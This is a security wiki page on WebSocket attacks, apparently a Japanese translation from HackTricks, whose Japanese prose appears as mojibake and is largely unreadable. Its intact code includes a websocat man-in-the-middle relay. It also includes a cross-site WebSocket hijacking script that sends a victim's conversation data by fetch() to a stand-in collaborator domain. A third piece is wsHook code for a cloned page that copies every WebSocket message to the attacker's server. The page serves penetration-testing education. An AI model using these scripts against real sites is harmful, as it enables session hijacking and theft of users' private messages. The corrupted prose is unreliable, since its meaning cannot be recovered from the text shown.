# WebSocket Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## What are WebSockets

WebSocketæ¥ç¶šã¯ã€æœ€åˆã®**HTTP**ãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯ã‚’é€šã˜ã¦ç¢ºç«‹ã•ã‚Œã€**é•·æœŸé–“**ã®æ¥ç¶šã‚’ç›®çš„ã¨ã—ã¦ãŠã‚Šã€ãƒˆãƒ©ãƒ³ã‚¶ã‚¯ã‚·ãƒ§ãƒ³ã‚·ã‚¹ãƒ†ãƒ ã‚’å¿…è¦ã¨ã›ãšã«ã„ã¤ã§ã‚‚åŒæ–¹å‘ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒ³ã‚°ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€WebSocketã¯ã€ãƒ©ã‚¤ãƒ–é‡‘èãƒ‡ãƒ¼ã‚¿ã‚¹ãƒˆãƒªãƒ¼ãƒ ãªã©ã®**ä½é…å»¶ã¾ãŸã¯ã‚µãƒ¼ãƒãƒ¼èµ·å‹•ã®é€šä¿¡**ã‚’å¿…è¦ã¨ã™ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ç‰¹ã«æœ‰åˆ©ã§ã™ã€‚

### Establishment of WebSocket Connections

WebSocketæ¥ç¶šã®ç¢ºç«‹ã«é–¢ã™ã‚‹è©³ç´°ãªèª¬æ˜ã¯[**ã“ã¡ã‚‰**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)ã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚è¦ç´„ã™ã‚‹ã¨ã€WebSocketæ¥ç¶šã¯é€šå¸¸ã€ä»¥ä¸‹ã«ç¤ºã™ã‚ˆã†ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®JavaScriptã‚’ä»‹ã—ã¦é–‹å§‹ã•ã‚Œã¾ã™ï¼š
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
`wss`ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯**TLS**ã§ä¿è­·ã•ã‚ŒãŸWebSocketæ¥ç¶šã‚’ç¤ºã—ã€`ws`ã¯**ä¿è­·ã•ã‚Œã¦ã„ãªã„**æ¥ç¶šã‚’ç¤ºã—ã¾ã™ã€‚

æ¥ç¶šã®ç¢ºç«‹ä¸­ã«ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¨ã‚µãƒ¼ãƒãƒ¼ã®é–“ã§HTTPã‚’ä»‹ã—ã¦ãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯ãŒè¡Œã‚ã‚Œã¾ã™ã€‚ãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯ãƒ—ãƒ­ã‚»ã‚¹ã§ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€ã‚µãƒ¼ãƒãƒ¼ãŒå¿œç­”ã—ã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã«ç¤ºã™ã‚ˆã†ã«ï¼š

ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ï¼š
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
ã‚µãƒ¼ãƒãƒ¼ã®ãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯å¿œç­”:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
æ¥ç¶šã¯ç¢ºç«‹ã•ã‚Œã‚‹ã¨ã€åŒæ–¹å‘ã§ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸äº¤æ›ã®ãŸã‚ã«ã‚ªãƒ¼ãƒ—ãƒ³ã®ã¾ã¾ã«ãªã‚Šã¾ã™ã€‚

**WebSocketãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯ã®é‡è¦ãªãƒã‚¤ãƒ³ãƒˆ:**

- `Connection`ãŠã‚ˆã³`Upgrade`ãƒ˜ãƒƒãƒ€ãƒ¼ã¯WebSocketãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯ã®é–‹å§‹ã‚’ç¤ºã—ã¾ã™ã€‚
- `Sec-WebSocket-Version`ãƒ˜ãƒƒãƒ€ãƒ¼ã¯ã€é€šå¸¸`13`ã®å¸Œæœ›ã™ã‚‹WebSocketãƒ—ãƒ­ãƒˆã‚³ãƒ«ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç¤ºã—ã¾ã™ã€‚
- Base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ©ãƒ³ãƒ€ãƒ å€¤ãŒ`Sec-WebSocket-Key`ãƒ˜ãƒƒãƒ€ãƒ¼ã«é€ä¿¡ã•ã‚Œã€å„ãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯ãŒãƒ¦ãƒ‹ãƒ¼ã‚¯ã§ã‚ã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã€ã‚­ãƒ£ãƒƒã‚·ãƒ³ã‚°ãƒ—ãƒ­ã‚­ã‚·ã«ã‚ˆã‚‹å•é¡Œã‚’é˜²ãã¾ã™ã€‚ã“ã®å€¤ã¯èªè¨¼ã®ãŸã‚ã§ã¯ãªãã€å¿œç­”ãŒèª¤ã£ã¦æ§‹æˆã•ã‚ŒãŸã‚µãƒ¼ãƒãƒ¼ã‚„ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã«ã‚ˆã£ã¦ç”Ÿæˆã•ã‚Œã¦ã„ãªã„ã“ã¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚
- ã‚µãƒ¼ãƒãƒ¼ã®å¿œç­”ã«ãŠã‘ã‚‹`Sec-WebSocket-Accept`ãƒ˜ãƒƒãƒ€ãƒ¼ã¯`Sec-WebSocket-Key`ã®ãƒãƒƒã‚·ãƒ¥ã§ã‚ã‚Šã€WebSocketæ¥ç¶šã‚’é–‹ãã¨ã„ã†ã‚µãƒ¼ãƒãƒ¼ã®æ„å›³ã‚’ç¢ºèªã—ã¾ã™ã€‚

ã“ã‚Œã‚‰ã®æ©Ÿèƒ½ã¯ã€ãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯ãƒ—ãƒ­ã‚»ã‚¹ãŒå®‰å…¨ã§ä¿¡é ¼æ€§ãŒã‚ã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã€åŠ¹ç‡çš„ãªãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ é€šä¿¡ã¸ã®é“ã‚’é–‹ãã¾ã™ã€‚

### Linuxã‚³ãƒ³ã‚½ãƒ¼ãƒ«

`websocat`ã‚’ä½¿ç”¨ã—ã¦WebSocketã¨ã®ç”Ÿã®æ¥ç¶šã‚’ç¢ºç«‹ã§ãã¾ã™ã€‚
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
ã¾ãŸã¯ã€websocatã‚µãƒ¼ãƒãƒ¼ã‚’ä½œæˆã™ã‚‹ã«ã¯ï¼š
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

ã‚‚ã—ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒç¾åœ¨ã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‹ã‚‰**HTTP websocket**ã«æ¥ç¶šã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã£ãŸå ´åˆã€[ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)ã‚’è©¦ã¿ã¦ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼ã®é–“ã§MitMæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒæ¥ç¶šã—ã‚ˆã†ã¨ã—ã¦ã„ã‚‹ã¨ãã«ã€æ¬¡ã®ã‚ˆã†ã«ä½¿ç”¨ã§ãã¾ã™:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

**ãƒ„ãƒ¼ãƒ«** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **ã‚’ä½¿ç”¨ã—ã¦ã€Websocketã®æ—¢çŸ¥ã®** **è„†å¼±æ€§** **ã‚’è‡ªå‹•çš„ã«ç™ºè¦‹ã€ãƒ•ã‚£ãƒ³ã‚¬ãƒ¼ãƒ—ãƒªãƒ³ãƒ†ã‚£ãƒ³ã‚°ã€æ¤œç´¢ã§ãã¾ã™ã€‚**

### Websocket Debug tools

* **Burp Suite** ã¯ã€é€šå¸¸ã®HTTPé€šä¿¡ã¨éå¸¸ã«ä¼¼ãŸæ–¹æ³•ã§MitM Websocketé€šä¿¡ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suiteæ‹¡å¼µæ©Ÿèƒ½** ã¯ã€**å±¥æ­´**ã‚’å–å¾—ã—ã€**ã‚¤ãƒ³ã‚¿ãƒ¼ã‚»ãƒ—ã‚·ãƒ§ãƒ³ãƒ«ãƒ¼ãƒ«**ã‚’è¨­å®šã—ã€**ãƒãƒƒãƒã¨ç½®æ›**ãƒ«ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã€**Intruder**ã‚„**AutoRepeater**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€Burpã§ã®Websocketé€šä¿¡ã‚’ã‚ˆã‚Šè‰¯ãç®¡ç†ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** "**WebSocket/Socket.io Proxy**"ã®ç•¥ã§ã€ã“ã®Node.jsã§æ›¸ã‹ã‚ŒãŸãƒ„ãƒ¼ãƒ«ã¯ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼é–“ã®ã™ã¹ã¦ã®WebSocketãŠã‚ˆã³Socket.IOé€šä¿¡ã‚’**ã‚­ãƒ£ãƒ—ãƒãƒ£ã€ã‚¤ãƒ³ã‚¿ãƒ¼ã‚»ãƒ—ãƒˆã€ã‚«ã‚¹ã‚¿ãƒ **ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã€è¡¨ç¤ºã™ã‚‹ãŸã‚ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’æä¾›ã—ã¾ã™ã€‚
* [**wsrepl**](https://github.com/doyensec/wsrepl) ã¯ã€ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆå°‚ç”¨ã«è¨­è¨ˆã•ã‚ŒãŸ**ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–Websocket REPL**ã§ã™ã€‚**å—ä¿¡Websocketãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’è¦³å¯Ÿã—ã€æ–°ã—ã„ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹**ãŸã‚ã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’æä¾›ã—ã€ã“ã®é€šä¿¡ã‚’**è‡ªå‹•åŒ–**ã™ã‚‹ãŸã‚ã®ä½¿ã„ã‚„ã™ã„ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’å‚™ãˆã¦ã„ã¾ã™ã€‚&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) ã¯ã€**websockets**ã‚’ä½¿ç”¨ã—ã¦ä»–ã®ã‚¦ã‚§ãƒ–ã¨é€šä¿¡ã™ã‚‹ãŸã‚ã®**ã‚¦ã‚§ãƒ–**ã§ã™ã€‚
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) ã¯ã€ä»–ã®é€šä¿¡/ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®ç¨®é¡ã®ä¸­ã§ã€**websockets**ã‚’ä½¿ç”¨ã—ã¦ä»–ã®ã‚¦ã‚§ãƒ–ã¨é€šä¿¡ã™ã‚‹ãŸã‚ã®**ã‚¦ã‚§ãƒ–**ã‚’æä¾›ã—ã¾ã™ã€‚

## Websocket Lab

[**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) ã«ã¯ã€Websocketsã‚’ä½¿ç”¨ã—ã¦ã‚¦ã‚§ãƒ–ã‚’èµ·å‹•ã™ã‚‹ãŸã‚ã®ã‚³ãƒ¼ãƒ‰ãŒã‚ã‚Šã€[**ã“ã®æŠ•ç¨¿**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) ã§èª¬æ˜ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## Cross-site WebSocket hijacking (CSWSH)

**ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆWebSocketãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯**ã€ã¾ãŸã¯**ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³WebSocketãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯**ã¯ã€WebSocketãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ç‰¹å®šã®ã‚±ãƒ¼ã‚¹ã¨ã—ã¦**[ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆCSRFï¼‰](csrf-cross-site-request-forgery.md)**ã¨ã—ã¦ç‰¹å®šã•ã‚Œã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã¯ã€WebSocketãƒãƒ³ãƒ‰ã‚·ã‚§ã‚¤ã‚¯ãŒ**CSRFãƒˆãƒ¼ã‚¯ãƒ³**ã‚„åŒæ§˜ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ãªã—ã«**HTTPã‚¯ãƒƒã‚­ãƒ¼**ã®ã¿ã§èªè¨¼ã•ã‚Œã‚‹ã¨ãã«ç™ºç”Ÿã—ã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€è„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆWebSocketæ¥ç¶šã‚’é–‹å§‹ã™ã‚‹**æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸**ã‚’ãƒ›ã‚¹ãƒˆã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’æ‚ªç”¨ã§ãã¾ã™ã€‚ãã®çµæœã€ã“ã®æ¥ç¶šã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã®è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ä¸€éƒ¨ã¨ã—ã¦æ‰±ã‚ã‚Œã€ã‚»ãƒƒã‚·ãƒ§ãƒ³å‡¦ç†ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã«ãŠã‘ã‚‹CSRFä¿è­·ã®æ¬ å¦‚ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚

### Simple Attack

**websocket**æ¥ç¶šã‚’**ç¢ºç«‹**ã™ã‚‹éš›ã«ã€**ã‚¯ãƒƒã‚­ãƒ¼**ãŒ**ã‚µãƒ¼ãƒãƒ¼**ã«**é€ä¿¡**ã•ã‚Œã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**ã‚µãƒ¼ãƒãƒ¼**ã¯ã€é€ä¿¡ã•ã‚ŒãŸã‚¯ãƒƒã‚­ãƒ¼ã«åŸºã¥ã„ã¦å„**ç‰¹å®šã®** **ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã‚’ãã®**websocket** **ã‚»ãƒƒã‚·ãƒ§ãƒ³**ã«**é–¢é€£ä»˜ã‘ã‚‹**ãŸã‚ã«ãã‚Œã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

æ¬¡ã«ã€ä¾‹ãˆã°**websocket** **ã‚µãƒ¼ãƒãƒ¼**ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**ä¼šè©±ã®å±¥æ­´**ã‚’è¿”ã™å ´åˆã€"**READY"**ã¨ã„ã†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒé€ä¿¡ã•ã‚Œã‚‹ã¨ã€**å˜ç´”ãªXSS**ãŒæ¥ç¶šã‚’ç¢ºç«‹ã—ï¼ˆ**ã‚¯ãƒƒã‚­ãƒ¼**ã¯è¢«å®³è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èªè¨¼ã™ã‚‹ãŸã‚ã«**è‡ªå‹•çš„ã«é€ä¿¡**ã•ã‚Œã¾ã™ï¼‰ã€"**READY**"ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§**ä¼šè©±ã®å±¥æ­´**ã‚’**å–å¾—**ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ + ç•°ãªã‚‹ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ã‚¯ãƒƒã‚­ãƒ¼

ã“ã®ãƒ–ãƒ­ã‚°æŠ•ç¨¿ [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) ã§ã¯ã€æ”»æ’ƒè€…ãŒ **ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³** ã§ **ä»»æ„ã®Javascriptã‚’å®Ÿè¡Œ** ã™ã‚‹ã“ã¨ã«æˆåŠŸã—ã¾ã—ãŸã€‚ã“ã‚Œã¯ **ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³** ã§ã‚ã£ãŸãŸã‚ã€**ã‚¯ãƒƒã‚­ãƒ¼** ãŒ **é€ä¿¡** ã•ã‚Œã€**WebsocketãŒOriginã‚’é©åˆ‡ã«ãƒã‚§ãƒƒã‚¯ã—ãªã‹ã£ãŸ** ãŸã‚ã€é€šä¿¡ãŒå¯èƒ½ã«ãªã‚Šã€**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€** ã“ã¨ãŒã§ãã¾ã—ãŸã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’ç›—ã‚€

ãªã‚Šã™ã¾ã—ãŸã„ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ã‚³ãƒ”ãƒ¼ã—ã¾ã™ï¼ˆä¾‹ãˆã° .html ãƒ•ã‚¡ã‚¤ãƒ«ï¼‰ãã—ã¦ã€ã‚¦ã‚§ãƒ–ã‚½ã‚±ãƒƒãƒˆé€šä¿¡ãŒè¡Œã‚ã‚Œã¦ã„ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆå†…ã«ã“ã®ã‚³ãƒ¼ãƒ‰ã‚’è¿½åŠ ã—ã¾ã™:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
ä»Šã€`wsHook.js`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’[https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook)ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€**ã‚¦ã‚§ãƒ–ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼å†…ã«ä¿å­˜ã—ã¦ãã ã•ã„**ã€‚\
ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å…¬é–‹ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãã‚Œã«æ¥ç¶šã™ã‚‹ã“ã¨ã§ã€websocketã‚’ä»‹ã—ã¦é€ä¿¡ãŠã‚ˆã³å—ä¿¡ã•ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ç›—ã‚€ã“ã¨ãŒã§ãã¾ã™ï¼š
```javascript
sudo python3 -m http.server 80
```
## ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³

WebSocketã«ãŠã‘ã‚‹ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã‚‚å­˜åœ¨ã—ã¾ã™ã€‚[ã“ã®æƒ…å ±ã‚’ç¢ºèªã—ã¦ã€è©³ç´°ã‚’å­¦ã‚“ã§ãã ã•ã„](race-condition.md#rc-in-websockets)ã€‚

## ãã®ä»–ã®è„†å¼±æ€§

WebSocketã¯**ã‚µãƒ¼ãƒãƒ¼å´ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã«ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã™ã‚‹ãƒ¡ã‚«ãƒ‹ã‚ºãƒ **ã§ã‚ã‚Šã€ã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒæƒ…å ±ã‚’ã©ã®ã‚ˆã†ã«å‡¦ç†ã™ã‚‹ã‹ã«ã‚ˆã£ã¦ã€**WebSocketã¯XSSã€SQLiã€ã¾ãŸã¯Webã®ä¸€èˆ¬çš„ãªè„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã«ã€WebSocketã‹ã‚‰ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’ä½¿ç”¨ã—ã¦ã€ä»–ã®ã„ãã¤ã‹ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**

## **WebSocketã‚¹ãƒ¢ã‚°ãƒªãƒ³ã‚°**

ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€**é€†ãƒ—ãƒ­ã‚­ã‚·ã®åˆ¶é™ã‚’å›é¿ã™ã‚‹**ã“ã¨ãŒã§ãã€**WebSocketé€šä¿¡ãŒç¢ºç«‹ã•ã‚ŒãŸ**ã¨ä¿¡ã˜è¾¼ã¾ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãŸã¨ãˆãã‚ŒãŒçœŸå®Ÿã§ãªãã¦ã‚‚ï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯**éš ã•ã‚ŒãŸã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**ã“ã¨ãŒã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
